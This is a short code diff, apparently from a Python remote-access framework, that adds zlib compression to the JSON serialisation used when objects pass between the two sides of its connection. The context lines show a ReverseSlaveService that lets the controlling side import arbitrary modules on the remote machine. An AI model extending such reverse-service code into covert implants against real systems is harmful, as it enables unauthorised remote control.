@@ -62,6 +62,7 @@ from network.lib.connection import PupyConnection
 import logging
 import shlex
 import marshal
+import zlib
 
 try:
     # additional imports needed to package with pyinstaller
@@ -95,7 +96,11 @@ def safe_obtain(proxy):
     if type(proxy) in [list, str, bytes, dict, set, type(None)]:
         return proxy
     conn = object.__getattribute__(proxy, "____conn__")()
-    return json.loads(conn.root.json_dumps(proxy)) # should prevent any code execution
+    return json.loads(
+        zlib.decompress(
+            conn.root.json_dumps(proxy, compressed=True)
+        )
+    ) # should prevent any code execution
 
 def obtain(proxy):
     """ allows to convert netref types into python native types """
@@ -195,8 +200,12 @@ class ReverseSlaveService(Service):
         """imports an arbitrary module"""
         return __import__(name, None, None, "*")
 
-    def exposed_json_dumps(self, obj):
-        return json.dumps(obj)
+    def exposed_json_dumps(self, obj, compressed=False):
+        data = json.dumps(obj)
+        if compressed:
+            data = zlib.compress(data)
+
+        return data
 
     def exposed_getconn(self):
         """returns the local connection instance to the other side"""
